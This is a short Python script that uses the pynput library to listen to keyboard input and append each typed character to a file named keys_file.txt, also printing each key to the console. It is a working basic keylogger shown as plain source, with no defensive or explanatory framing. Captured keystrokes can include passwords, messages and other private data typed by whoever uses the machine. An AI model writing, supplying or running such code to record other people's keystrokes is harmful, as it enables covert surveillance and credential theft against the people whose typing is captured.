from pynput import keyboard

def pressed_key(key):
    print(str(key))
    with open("keys_file.txt","a") as kf:
        try: 
             # Try to get the character of the pressed key
            ch= key.char
            kf.write(ch)
        except:
            print()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=pressed_key)
    listener.start()
    input()                  